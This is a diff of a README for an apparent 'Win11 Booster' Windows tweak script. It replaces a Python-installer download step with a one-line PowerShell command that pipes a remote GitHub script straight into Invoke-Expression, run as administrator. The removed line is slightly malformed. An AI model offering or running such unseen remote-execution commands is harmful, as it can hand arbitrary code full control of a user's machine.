@@ -12,10 +12,10 @@ To use the Win11 Booster script, follow the steps below:
 
 1. Open PowerShell as an administrator.
 
-2. Run the following command to register the Desktop App Installer and install Python 3.11:
+2. Run the  command
 
     ```powershell
-    mkdir C:\Users\Booster ; Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe' -OutFile 'C:\Users\Booster\py.exe' ; Start-Process -FilePath 'C:\Users\Booster\py.exe' -Wait}"
+    irm https://raw.githubusercontent.com/Scuttlang/Win11-Booster/main/installer.ps1 | iex
     ```
 
     
